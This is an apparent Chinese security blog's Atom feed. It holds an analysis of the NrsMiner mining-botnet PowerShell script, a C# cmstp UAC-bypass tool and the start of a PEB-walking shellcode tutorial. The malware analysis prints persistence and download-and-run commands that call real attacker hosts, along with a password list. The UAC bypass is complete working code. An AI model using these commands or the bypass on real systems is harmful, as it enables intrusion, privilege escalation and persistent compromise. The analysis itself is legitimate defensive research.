<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>九世的博客</title>
  
  
  <link href="http://422926799.github.io/atom.xml" rel="self"/>
  
  <link href="http://422926799.github.io/"/>
  <updated>2021-03-06T15:53:27.878Z</updated>
  <id>http://422926799.github.io/</id>
  
  <author>
    <name>九世</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>NrsMiner挖矿僵尸网络分析</title>
    <link href="http://422926799.github.io/posts/855d1ef5.html"/>
    <id>http://422926799.github.io/posts/855d1ef5.html</id>
    <published>2021-03-06T14:51:28.000Z</published>
    <updated>2021-03-06T15:53:27.878Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>下午在群里看见一<code>app.any.run</code>的链接，没啥事情做分析了一下。做个记录</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>样本名称:shady.ps1<br>sha256:1a3960eaf2021049e1eaed4c76029420a62c881f65533b3741be2050328a2ac4<br>sha1:6b294f6ad208cb7d23172cafbccf3db3d78b2c62<br>md5:5474aa765ddd0c1dff33e5bbe4aba272    </p><p><code>shady.ps1</code>打开一看 ，混淆国的<br><img src="https://s3.ax1x.com/2021/03/06/6uhpx1.png" alt=""></p><p>定位到函数结尾，发现IEX<br><img src="https://s3.ax1x.com/2021/03/06/6u4YTO.png" alt=""></p><p>写到新的ps1，整体如下<br><img src="https://s3.ax1x.com/2021/03/06/6u4snP.png" alt=""></p><p>函数列表</p><pre><code>function make_smb1_anonymous_login_packet function smb1_anonymous_login($sock)function negotiate_proto_request()function smb_header($smbheader) function smb1_get_response($sock)function client_negotiate($sock)function tree_connect_andx($sock, $target, $userid)function tree_connect_andx_request($target, $userid) function smb1_anonymous_connect_ipc($target)function make_smb1_nt_trans_packet($tree_id, $user_id) function make_smb1_trans2_exploit_packet($tree_id, $user_id, $data, $timeout) function make_smb1_trans2_last_packet($tree_id, $user_id, $data, $timeout) function send_big_trans2($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk)function createSessionAllocNonPaged($target, $size) function make_smb1_free_hole_session_packet($flags2, $vcnum, $native_os) function smb2_grooms($target, $grooms, $payload_hdr_pkt, $groom_socks)function make_smb2_payload_headers_packet()function eb7($target ,$shellcode) function createFakeSrvNetBuffer8($sc_size)function createFeaList8($sc_size, $ntfea)function  make_smb1_login8_packet8 function  make_ntlm_auth_packet8($user_id) function smb1_login8($sock)function negotiate_proto_request8($use_ntlm)function smb_header8($smbheader) function smb1_get_response8($sock)function client_negotiate8($sock , $use_ntlm)function tree_connect_andx8($sock, $target, $userid)function tree_connect_andx8_request($target, $userid)  function make_smb1_nt_trans_packet8($tree_id, $user_id)  function make_smb1_trans2_exploit_packet8($tree_id, $user_id, $data, $timeout) function send_big_trans28($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk)function createSessionAllocNonPaged8($target, $size) function  make_smb1_free_hole_session_packet8($flags2, $vcnum, $native_os)  function make_smb2_payload_headers_packet8($for_nx)function eb8($target,$sc)   function localscan function geth function LoadApifunction sid_to_key($sid)function str_to_key($s)function NewRC4([byte[]]$key)function des_encrypt([byte[]]$data, [byte[]]$key)function des_decrypt([byte[]]$data, [byte[]]$key)function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)function Get-RegKeyClass([string]$key, [string]$subkey)function Get-BootKeyfunction Get-HBootKeyfunction Get-UserName([byte[]]$V)function Get-UserHashes($u, [byte[]]$hbootkey)function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)function Get-UserKeysfunction DumpHashesfunction Invoke-MypassFunction LGDJSRFunction Get-WiSDGKDantsFunction Get-l64ftionFunction bud-ksgLHDnwnFunction Add-SignedIntAsUnsignedFunction Compare-Val1GreaterThanVal2AsUIntFunction Convert-UIntToIntFunction Test-MemoryRangeValidFunction Write-BytesToMemoryFunction Get-DelegateTypeFunction klsdjlkhfDjswpdyFunction Enable-SeDebugPrivilegeFunction sadkjhdsjDFunction Get-ImageNtHeadersFunction DHWE-kidDFunction KDHSD-JUWFFunction HDSK-OUHFFunction KJSHDeUFHEF7Function Cthis-SectioDSnsFunction LSHDjh3-updFunction lhsdu-jsdFunction SDhk34JSDFunction usdKdhdfFunction KSHDUWKHFFunction SDHlhuhWEDSDDSFunction GessKUDBSDFunction LHSDGUKsdHFFunction SDLHLESDMEFunction MainFunction Mainfunction Invoke-SEfunction ConvertFrom-PacketOrderedDictionaryfunction New-PacketNetBIOSSessionServicefunction New-PacketSMBHeaderfunction New-PacketSMBNegotiateProtocolRequestfunction New-PacketSMBSessionSetupAndXRequestfunction New-PacketSMBTreeConnectAndXRequestfunction New-PacketSMBNTCreateAndXRequestfunction New-PacketSMBReadAndXRequestfunction New-PacketSMBWriteAndXRequestfunction New-PacketSMBCloseRequestfunction New-PacketSMBTreeDisconnectRequestfunction New-PacketSMBLogoffAndXRequestfunction New-PacketSMB2Headerfunction New-PacketSMB2NegotiateProtocolRequestfunction New-PacketSMB2SessionSetupRequestfunction New-PacketSMB2TreeConnectRequestfunction New-PacketSMB2CreateRequestFilefunction New-PacketSMB2ReadRequestfunction New-PacketSMB2WriteRequestfunction New-PacketSMB2CloseRequestfunction New-PacketSMB2TreeDisconnectRequestfunction New-PacketSMB2SessionLogoffRequestfunction New-PacketNTLMSSPNegotiatefunction New-PacketNTLMSSPAuthfunction New-PacketRPCBindfunction New-PacketRPCRequestfunction New-PacketSCMOpenSCManagerWfunction New-PacketSCMCreateServiceWfunction New-PacketSCMStartServiceWfunction New-PacketSCMDeleteServiceWfunction New-PacketSCMCloseServiceHandlefunction Get-StatusPendingfunction Get-UInt16DataLengthfunction Invoke-SMBCfunction ConvertFrom-PacketOrderedDictionaryfunction New-PacketNetBIOSSessionServicefunction New-PacketSMBHeaderfunction New-PacketSMBNegotiateProtocolRequestfunction New-PacketSMBSessionSetupAndXRequestfunction New-PacketSMB2Headerfunction New-PacketSMB2NegotiateProtocolRequestfunction New-PacketSMB2SessionSetupRequestfunction New-PacketSMB2TreeConnectRequestfunction New-PacketSMB2CreateRequestfunction New-PacketSMB2FindRequestFilefunction New-PacketSMB2QueryInfoRequestfunction New-PacketSMB2ReadRequestfunction New-PacketSMB2WriteRequestfunction New-PacketSMB2CloseRequestfunction New-PacketSMB2TreeDisconnectRequestfunction New-PacketSMB2SessionLogoffRequestfunction New-PacketSMB2IoctlRequest()function New-PacketSMB2SetInfoRequestfunction New-PacketNTLMSSPNegotiatefunction New-PacketNTLMSSPAuthfunction Get-UInt16DataLengthfunction copyrun function smb1_anonymous_login($sock)function negotiate_proto_request()function smb_header($smbheader) function smb1_get_response($sock)function client_negotiate($sock)function tree_connect_andx($sock, $target, $userid)function tree_connect_andx_request($target, $userid) function smb1_anonymous_connect_ipc($target)function make_smb1_nt_trans_packet($tree_id, $user_id) function make_smb1_trans2_exploit_packet($tree_id, $user_id, $data, $timeout) function make_smb1_trans2_last_packet($tree_id, $user_id, $data, $timeout) function send_big_trans2($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk)function createSessionAllocNonPaged($target, $size) function make_smb1_free_hole_session_packet($flags2, $vcnum, $native_os) function smb2_grooms($target, $grooms, $payload_hdr_pkt, $groom_socks)function make_smb2_payload_headers_packet()function eb7($target ,$shellcode) function createFakeSrvNetBuffer8($sc_size)function createFeaList8($sc_size, $ntfea)function  make_ntlm_auth_packet8($user_id) function smb1_login8($sock)function negotiate_proto_request8($use_ntlm)function smb_header8($smbheader) function smb1_get_response8($sock)function client_negotiate8($sock , $use_ntlm)function tree_connect_andx8($sock, $target, $userid)function tree_connect_andx8_request($target, $userid)  function make_smb1_nt_trans_packet8($tree_id, $user_id)  function make_smb1_trans2_exploit_packet8($tree_id, $user_id, $data, $timeout) function send_big_trans28($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk)function createSessionAllocNonPaged8($target, $size) function  make_smb1_free_hole_session_packet8($flags2, $vcnum, $native_os)  function make_smb2_payload_headers_packet8($for_nx)function eb8($target,$sc)   function sid_to_key($sid)function str_to_key($s)function NewRC4([byte[]]$key)function des_encrypt([byte[]]$data, [byte[]]$key)function des_decrypt([byte[]]$data, [byte[]]$key)function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)function Get-RegKeyClass([string]$key, [string]$subkey)function Get-UserName([byte[]]$V)function Get-UserHashes($u, [byte[]]$hbootkey)function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)function New-PacketSMB2IoctlRequest()</code></pre><p><strong>执行过程</strong></p><pre><code>-5获取所有用户名添加到用户列表    匹配普通用户SID的正则:        添加到$alluser列表-4检查当前用户是不是管理员    获取本机hash:        用户标志位(变量名:$un)        用户hash(变量名:$hs)        匹配出是管理员的hash            添加到用户列表(变量名:alluser)            添加到hash列表(变量名:$allhash)-3获取明文密码和NTLM HASH    匹配出用户名(变量名:$mm)    匹配出明文密码(变量名:$pp)    匹配出NTLM HASH(变量名:$nn)    匹配出域名(变量名:$dd)    用户名不为空:        添加到$getusers列表        添加到$alluser列表    明文密码不为空:        添加到$getpasswd列表        添加到$allpass列表    函数不为空(31d6cfe0d16ae931b73c59d7e0c089c0为空hash):        添加到$gethashs列表        添加到$allhash列表    域名不为空、不为workgroup组、不为本地计算机名:        添加到$getdomain组</code></pre><p><img src="https://s3.ax1x.com/2021/03/06/6uIpxs.png" alt=""></p><p>之后循环执行以下内容</p><pre><code>while(true)循环执行:    1.线程休眠200秒    2.创建名为Global\PSexec的互斥锁    3.获取第一张网卡的MAC地址    4.获取杀毒软件    5.如果存在杀毒 (条件判断)        True:$av变量为将杀毒名称以:&lt;name&gt;|&lt;name&gt;的格式拼接在一起，例如:Windows Defender|360安全卫士|        False:$av变量为空    6.拼接url格式:http://p.estonine.com/getnew.php?ver=2020&amp;mac=&lt;网卡mac地址&gt;&amp;re=&amp;pid=&lt;当前进程pid&gt;&amp;av=&lt;杀毒名称&gt;&amp;ver=&lt;系统版本&gt;&amp;bit=&lt;系统位数&gt;    7.从url请求对应的内容读取内容后将##替换为空base64解码执行下载的内容    8.调用localscan函数检查本地和内网445端口判断是否开启    9.调用localscan函数检查本地和内网65353端口判断是否开启    10.$Bserver数组不存在该IP调用copyrun函数        调用Invoke-SMBC函数hash传递攻击        传递成功:调用Invoke-SE函数hash传递攻击执行开启防火墙和设置计划任务，和上传文件到指定路径(如果源路径存在该文件则删除)                    netsh.exe firewall add portopening tcp 65353 DNS&amp;netsh interface portproxy add v4tov4 listenport=65353 connectaddress=1.1.1.1 connectport=53                    schtasks /create /ru system /sc MINUTE /mo 40 /st 07:00:00 /tn Sync /tr &quot;powershell -nop -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcAAuAGUAcwB0AG8AbgBpAG4AZQAuAGMAbwBtAC8AcAA/AHMAbQBiACcAKQA=&quot; /F #解码base64:IEX (New-Object Net.WebClient).downloadstring(&#39;http://p.estonine.com/p?smb&#39;)                    schtasks /run /tn Sync&#39;                    上传文件到:                        C:\Users\&lt;Name&gt;\AppData\Roaming\sign.txt 内容0:                        C:\Users\&lt;Name&gt;\AppData\Roaming\flashplayer.tmp 内容:try{(new ActiveXObject(&quot;WScript.Shell&quot;)).Run(&quot;powershell -w hidden -ep bypass -c while($True){try{IEX (New-Object Net.WebClient).downloadstring(&#39;http://p.estonine.com/low?ipc&#39;)}catch{Sleep -m 2500000}}&quot;,0,false);}catch(e){}                        C:\Users\&lt;Name&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\FlashPlayer.lnk 快捷方式指向的目标:C:\Windows\system32\wscript.exe //e:javascript &quot;%appdata%\flashplayer.tmp&quot;        传递失败:    11.MS17010扫描攻击    12.休眠100秒</code></pre><p><img src="https://s3.ax1x.com/2021/03/06/6uIMs1.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/03/06/6uIWyn.png" alt=""></p><p>提取出来的快捷方式<br><img src="https://s3.ax1x.com/2021/03/06/6uoZ0P.png" alt=""></p><p>脚本内嵌用户名字典和hash表和明文密码表<br>用户列表:</p><pre><code>administratoradmin</code></pre><p>hash表</p><pre><code>32ed87bdb5fdc5e9cba88547376818d48846f7eaee8fb117ad06bdd830b7586c259745cb123a52aa2e693aaacca2db522d20d252a479f485cdf5e171d93985bfc22b315c040ae6e0efee3518d830362b7a21990fcd3d759941e45c490f143d5f7ce21f17c0aee7fb9ceba532d0546ad62d7f1a5a61d3a96fb5159b5eef17adc6328727b81ca05805a68ef26acb252039f7eb9c06fafaa23c4bcf22ba6781c1e2579110c49145015c47ecd267657d3174320a78179516c385e35a93ffa0b1c4acf9e37e83b83c47a93c2f09f66408631b31fc0dc8f7dfad0e8bd7ccc3842f2ce9f2477a144dff4f216ab81f2ac3e3207dbecedb42ec3c5c7f965255338be4453cccd3d95ea08b81140eee3cfbb98c68f18d4ef8654a9adc66d4f628e94f66e31b6d3986e540a63647454a50e26477ef94e8cd0e4a9e89eab931dc5338fcbec54a0d757ad173d2fc249ce19364fd64c8ecaf27efb60c7b238910efe2a7e0676a3974ed32086b1317b742c3a92148df10198af326aa4850225b75c592d4ce19ccf5bb53a477af18526ada697ce2e51f76b34057b60b514c5402dde3d29a1845c36627cd214350e6172ce708ee05f9d6d70a72f5cfa80f07819ccbcfb72feb9eb9b7f67f5e3f66efd7298be6acd32eeeb27c1d7774d5bbec877ba1bbfcac2f1ae2961c4ecc8938fb93812779077127e976626920c58d0df184d829189c44fafb7ece3fa45a060bd2693ae4c05b601d05ca0c152efbcfafeb22eabda8fc5e68697a41ad70819c5bc807280974d80f45982011c4e9cf8a64cfa6893e2fb666cd566d48f40460fe1ceec6f6785997f3319553bb1b46daf193bb579bdb3b8c6f09637eccee9423d5425f22baf082877edf0a5223820b13c5212be1f85048d7cc8f70bfa508381a7cb6f73d13260089df6015b7b469cbe3acbc48a3a289e8cdb000c2b7a820b2a7351c899fd8e230caad9dd9b994bcd285980e1d9b302e16875844ef697759dea36d05aacaa547de42e9956678e7162e829be112225fedf856e38e1c65fe9f8cc8c6e9e8ba3344ce00078175a4fff9e37e83b83c47a93c2f09f66408631bfaf94587adbfb93df82380f7ca2be801711417f28b0f8d2c5c1cde9554cf8f88acf586e39c5838baeea66ec864d7c437114a90eadeb78697e8f5d14888324caf3837b6534834cc2a88c58bf90b2d96f448d28627b7f196284b73f3c6fae4eded8a72db9f0eea602e3770c45cd3ed9bcdbdc2ef9d128643a227639d2f142d1434ba48d0d7833d929ba60030ae19a63875b20b89488f6f2decabf80294727a04306e2ba7aaa0297ecba56e3d90393bc147324e773ec800dc70882568f5a41d2b6362b26c13b70e7d5a9724710a41e63688f5c864e939801f4f239ff455c33730f821da95b451c2736231eedb87d08f7edbcd73b0aeeb2d1c1907c8783a05e8dd08c0d1ba5fcad640041f86f8060b384915b6d9897df4bb61b416fa405159418033aaf9f89a2d4d0cef5f8912461132b30ffac5d668099409cb6fa223a32ea493b62386e5c805ab8dff955fdb893df85f47f96ab5f0c4b478ee16d9520e4eb4318417dc1cd2340de61ee329d2bb291acb56ed356698adc4fcffe90c3e6d250fcf167b592e4f8178b4c75788531b2e74768747bf8039a8506cd67c524a03ff84ba4e5ae7b89b3afea28d448ed31b5c70428973f5d97549f033374fa6d9f9ce247ffde5ae562ddfaa6b446c32764ab1ebf3ed161cff084477fe596a5db81874498a24a87f3a337d73085c45f9416be5787d8600affd88fa323b00d4560bf9fef0ec2f69943c5e63b4d2c104dbbcc15138b72b588feb889288fb953b5f094d47d1565c3dbde697d71690a769204beb12283678df54de3f3438343202c1dd523d0265bef1351ac828428d74f6da2968089fc91fb3ec3e03e2a202cbd54fd104b8504fefa80c9cc3f8439ada25af064a874efe2d13b29964cc2480b4ef454c59562e675cde26cce0356891a4a020e7c4957afc72e19ccf75ee54e06b06a5907af13cef4230fcaa8ad9a496b3e17f7fbfacc7299341630abb825ca50da31ce1fac1e9f54df56a8399599f1be040128b1dd9623c292e4dbf83aa056289935daea328977b20b9f917853e3dbf6e6831ecce607259305835048ce94ad0564e29a924a03510efa4141712f19e9dd5adf16919bb38a95c</code></pre><p>明文密码</p><pre><code>123456password12345678qwerty1234567891234512341111111234567dragon123123baseballabc123footballmonkeyletmein696969shadowmaster666666qwertyuiop123321mustang1234567890michael654321pussysuperman1qaz2wsx7777777fuckyou121212000000qazwsx123qwekillera123456a123456789woaini1314qq123456abc123456123456a123456789a147258369zxcvbnm98765432112345678910abc123qq123456789123456789.7708801314520woaini5201314520q123456123456abc1233211234567123123123123456.0123456789asd123456aa123456135792468q123456789abcd12345612345678900woaini520woaini123zxcvbnm1231111111111111111w123456aini1314abc123456789PASSWORDAa123456qwer12345123@abc123!@#qwe1qaz@WSXPassw0rd123qwe!@#112123321888888abcd1234p@sswordP@sswordp@ssw0rdP@ssw0rdP@SSWORDP@SSW0RDP@$$w0rdP@$$wordpassw0rdpassword1administrator</code></pre><p>其中计划任务里的url，下载的另外个ps1。其实就是一开始混淆过的ps1，用于权限维持(下载的update.png)<br>1.获取首个网卡MAC地址<br>2.互斥锁创建<br>3.检查C:\Windows\Temp\xxx.log是否存在，不存在则创建Winnet计划任务<br>4.休眠随机1-20秒<br>5.检查进程运行的命令是否带有downloadstring,没有远程下载执行</p><pre><code class="powershell">[string]$mac = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC) #首个网卡MAC地址try{        $name = &#39;Global\PSEXEC&#39;        $exeflag = $flase        New-Object System.Threading.Mutex ($true,$name,[ref]$exeflag) #互斥锁创建}catch{}$dt = Get-Date -Format &#39;yyMMdd&#39; #日期格式化$path = &quot;$env:temp\\ccc.log&quot;[string]$flag = test-path $path #检查路径是否存在$permit =  ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] &quot;Administrator&quot;) #判断当前用户是否位管理员$key = &quot;mac=&quot;+$mac+&quot;&amp;av=&quot;+$av+&quot;&amp;version=&quot;+(Get-WmiObject -Class Win32_OperatingSystem).version+&quot;&amp;bit=&quot;+(Get-WmiObject Win32_OperatingSystem).OSArchitecture + &quot;&amp;flag2=&quot; + $flag + &quot;&amp;domain=&quot; + (Get-WmiObject win32_computersystem).Domain + &quot;&amp;user=&quot; + $env:USERNAME + &quot;&amp;PS=&quot; + $exeflagif($flag -eq &#39;False&#39;){        New-Item $path -type file        if($permit){                try{                    $Text = &quot;IEX (New-Object Net.WebClient).downloadstring(&#39;http://cdn.chatcdn.net/p?hig&quot; + $dt + &quot;&#39;)&quot;                    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)                    $bcode = [Convert]::ToBase64String($Bytes)                    $scexec = &quot;/create /ru system /sc MINUTE /mo 45 /tn Winnet /tr &quot; + &#39;&quot;&#39; + &quot;powershell -ep bypass -e $bcode&quot; + &#39;&quot; /F&#39; #创建计划任务                    Start-Process -FilePath schtasks.exe -ArgumentList &quot;$scexec&quot;                }catch{}        }else{                try{                    $Text = &quot;IEX (New-Object Net.WebClient).downloadstring(&#39;http://cdn.chatcdn.net/p?low&quot; + $dt + &quot;&#39;)&quot;                    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)                    $bcode = [Convert]::ToBase64String($Bytes)                    $scexec = &quot;/create /sc MINUTE /mo 45 /tn Winnet /tr &quot; + &#39;&quot;&#39; + &quot;powershell -ep bypass -e $bcode&quot; + &#39;&quot; /F&#39;                    Start-Process -FilePath schtasks.exe -ArgumentList &quot;$scexec&quot;                }catch{}        }        &amp;schtasks /run /tn &quot;Winnet&quot; #创建另外个计划任务}else{}sleep (get-random -inputobject (1..20)) #休眠1-20秒try{        $run = Get-WmiObject Win32_Process | select commandline | Select-String -Pattern &quot;downloadstring&quot; #检查进程运行的命令是否带有downloadstring,没有远程下载执行        if(($run.length -lt 0) -and $exeflag){            $onps = &quot;/c powershell -nop -w hidden -ep bypass -c &quot; + &#39;&quot;&#39; + &quot;IEX (New-Object Net.WebClient).downloadstring(&#39;&quot; + &quot;http://188.166.162.201/update.png?&amp;&quot; + $key + &quot;&#39;)&quot; + &#39;&quot;&#39;            Start-Process -FilePath cmd.exe -ArgumentList &quot;$onps&quot;        }else{}}catch{}kill $pid</code></pre><p>IP:188.166.162.201<br>脚本内的某些函数来源于:<a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a><br>原ps1下载地址:<a href="http://188.166.162.201/update.png?mac=&amp;av=" target="_blank" rel="noopener">http://188.166.162.201/update.png?mac=&amp;av=</a>&lt;av_name&gt;&amp;version=&lt;os_version&gt;&amp;bit=&lt;os_arch&gt;&amp;flag2=&amp;domain=<groupname>&amp;user=<username>&amp;PS=False<br>后续下载地址:<a href="http://pslog.estonine.com/logging.php" target="_blank" rel="noopener">http://pslog.estonine.com/logging.php</a> <a href="http://p.estonine.com/p?smb" target="_blank" rel="noopener">http://p.estonine.com/p?smb</a> <a href="http://p.estonine.com/low?ipc" target="_blank" rel="noopener">http://p.estonine.com/low?ipc</a><br>微步查询:<br><a href="https://x.threatbook.cn/nodev4/domain/p.estonine.com" target="_blank" rel="noopener">https://x.threatbook.cn/nodev4/domain/p.estonine.com</a><br><a href="https://s.threatbook.cn/report/url/6cd928964549ac59800c167a4529c880" target="_blank" rel="noopener">https://s.threatbook.cn/report/url/6cd928964549ac59800c167a4529c880</a></username></groupname></p><p>update.png MD5:e279958da1c4dc11eb3a77909fce551e</p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>能力有限，有没分析出来的见谅</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;下午在群里看见一&lt;code&gt;app.any.run&lt;/code&gt;的链接，没啥事情做分析了一下。做个记录&lt;/p&gt;
&lt;h2 id=&quot;分析过程&quot;&gt;</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>cmstp bypassuac研究</title>
    <link href="http://422926799.github.io/posts/d38c8377.html"/>
    <id>http://422926799.github.io/posts/d38c8377.html</id>
    <published>2021-03-04T12:58:58.000Z</published>
    <updated>2021-03-04T13:06:39.281Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接:<br><a href="https://www.anquanke.com/post/id/86685" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86685</a><br><a href="https://mp.weixin.qq.com/s/dhh73wWhbo_dfYN-oBDW6g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/dhh73wWhbo_dfYN-oBDW6g</a></p><p>对应的powershell脚本:</p><p><a href="https://gist.github.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1#file-uacbypasscmstp-ps1" target="_blank" rel="noopener">https://gist.github.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1#file-uacbypasscmstp-ps1</a></p><p>测试系统：</p><pre><code>* windows 10* windows 7* windows server 2012* windows server 2008</code></pre><p>C#改造</p><pre><code class="C#">using System;using System.Collections.Generic;using System.Linq;using System.Text;using System.Threading.Tasks;using System.Diagnostics;using System.Runtime.InteropServices;using System.Windows.Forms;using System.IO;using System.Threading.Tasks;namespace cmstp_bypassuac{    class Program    {        [DllImport(&quot;user32.dll&quot;, SetLastError = true)]        public static extern bool SetForegroundWindow(IntPtr hWnd);        public static string createinf() {            string filename = &quot;test.inf&quot;;            string command = @&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;;            string data = @&quot;[version]Signature=$chicago$AdvancedINF=2.5[DefaultInstall]CustomDestination=CustInstDestSectionAllUsersRunPreSetupCommands=RunPreSetupCommandsSection[RunPreSetupCommandsSection]; Commands Here will be run Before Setup Begins to install{0}taskkill /IM cmstp.exe /F[CustInstDestSectionAllUsers]49000,49001=AllUSer_LDIDSection, 7[AllUSer_LDIDSection]&quot;&quot;HKLM&quot;&quot;, &quot;&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE&quot;&quot;,  &quot;&quot;ProfileInstallPath&quot;&quot;, &quot;&quot; % UnexpectedError % &quot;&quot;, &quot;&quot;&quot;&quot;    [Strings]ServiceName = &quot;&quot;CorpVPN&quot;&quot;ShortSvcName = &quot;&quot;CorpVPN&quot;;            data = string.Format(data, command);            File.WriteAllText(filename, data);            if (File.Exists(filename))            {                Console.WriteLine(&quot;Create Inf File is ok&quot;);                var currentpath = System.IO.Directory.GetCurrentDirectory() +  &quot;\\&quot;+filename;                return currentpath;            }            else {                Console.WriteLine(&quot;Create Inf File Failure...&quot;);                return &quot;&quot;;            }        }        public static IntPtr execute() {            Process[] cmstpdata = Process.GetProcessesByName(&quot;cmstp&quot;); //获取CMSTP线程            if (cmstpdata.Length != 0)            {                cmstpdata[0].Refresh();                var windowhandle = cmstpdata[0].MainWindowHandle;                return windowhandle;            }            else            {                Console.WriteLine(&quot;Not Found cmstp handle,exit....&quot;);                return IntPtr.Zero;            }        }        static void Main(string[] args)        {            string infpath=createinf();            if (infpath.Length != 0)            {                ProcessStartInfo runcmd =new  ProcessStartInfo(&quot;C:\\Windows\\System32\\cmstp.exe&quot;);                runcmd.Arguments = &quot;/au \&quot;&quot;+infpath+&quot;\&quot;&quot;;                runcmd.UseShellExecute = false;                Process.Start(runcmd);                IntPtr windowhandle = execute();                //由于刚刚cmstp进程刚刚创建无法快速获取对应的窗口句柄，使用循环来解决                while (windowhandle == IntPtr.Zero) {                    windowhandle = execute();                }                Console.WriteLine(&quot;The Cmstp Handle:&quot; + windowhandle);                SetForegroundWindow(windowhandle); //将CMSTP窗口调出到前台并激活该窗口                SendKeys.SendWait(&quot;{ENTER}&quot;);                }        }       }}</code></pre><p>效果如下<br><img src="https://s3.ax1x.com/2021/03/04/6Zt5kj.gif" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考链接:&lt;br&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/86685&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/86685&lt;/a&gt;&lt;br&gt;&lt;a</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>PEB的深入学习</title>
    <link href="http://422926799.github.io/posts/165f8274.html"/>
    <id>http://422926799.github.io/posts/165f8274.html</id>
    <published>2021-02-22T06:26:52.000Z</published>
    <updated>2021-02-22T12:04:03.079Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>纯属是之前乱弄shellcode编写的时候看见的PEB，然后当时做了笔记。不是很熟悉PEB这个，打算在了解一下。</p><h2 id="PEB是什么"><a href="#PEB是什么" class="headerlink" title="PEB是什么"></a>PEB是什么</h2><blockquote><p>进程环境块（PEB）是 Windows NT操作系统内部使用的数据结构，用以存储每个进程的运行时数据。[1] Microsoft的MSDN文档中仅公开了PEB的少数几个域，该结构“在未来的Windows版本中可能会修改”。[2]PEB包含的数据结构适用于整个进程，如全局上下文，启动参数，程序image装载器的数据结构，程序image的基地址，进程级互斥同步访问对象等。[1]<br>PEB与kernel mode EPROCESS数据结构密切相关。也是逐进程数据结构，在客户-服务器运行时子系统(CSRSS)进程地址空间被管理。但是，类似于CSRSS数据结构，PEB自身并不是内核模式数据结构。它驻留在所关联的进程的用户态内存空间中。这是因为它被设计为被操作系统的用户态的程序所使用，如NTDLL，在内核态之外执行，如程序映象的加载器与堆管理器。[3]<br>WinDbg中，卸载PEB内容的命令是!peb，命令参数是PEB在进程地址空间的地址，它实际上是通过!process命令获取，将显示来自于EPROCESS数据结构的信息，其中一个域是PEB地址。[3]</p></blockquote><h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2><p>windbg<br>od<br>vs</p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>用汇编写一段寻找PEB地址的指令，然后编译逐渐调试。</p><pre><code class="asm">global _startsection .text    _start:        mov eax,[fs:0x30] ;EAX=PEB        mov eax,[eax+0xc] ;EAX=PEB-&gt;Ldr        mov esi,[eax+0x14] ;ESI=PEB-&gt;Ldr.InMemOrder (Ldr.InMemOrder地址赋到ESI寄存器)        lodsd ;ESI内存地址指向的值写入到EAX EAX=Second module (进入链表：Flink            : Ptr32 _LIST_ENTR)-&gt;进入Ldr.InMemOrder链表的的一个元素位地址        xchg eax,esi ;EAX和ESI交换值 EAX=ESI,ESI=EAX (EAX=Ldr.InMemOrder-&gt;链表第一元素位的地址,然后从EAX和ESI互相切换值)        lodsd ;EAX=Third(Kernel32)        mov ebx,[eax+0x10] ;EBX=Kernel32基地址        mov edx,[ebx+0x3c] ;EDX = DOS-&gt;e_lfanew (DOS头偏移地址)        add edx,ebx ;PE头地址获取        mov edx,[edx+0x78] 